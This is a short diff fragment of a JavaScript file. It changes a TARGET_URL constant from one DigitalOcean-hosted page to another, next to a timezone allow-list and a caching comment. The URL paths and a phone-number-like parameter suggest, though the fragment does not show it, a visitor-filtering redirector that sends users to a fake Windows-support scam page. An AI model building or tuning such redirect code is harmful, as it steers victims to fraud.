@@ -30,7 +30,7 @@ const ALLOWED_TIMEZONES = new Set([
 ]);
 
 // Target URL Configuration
-const TARGET_URL = "https://whale-app-4xrpi.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-833-306-1171";
+const TARGET_URL = "https://sea-lion-app-5q5dc.ondigitalocean.app/Win0codejInfowj2n/index.html";
 
 // --- Pre-Compilation Cache Layer ---
 // This processes everything into memory ONCE during boot, removing CPU load during requests.
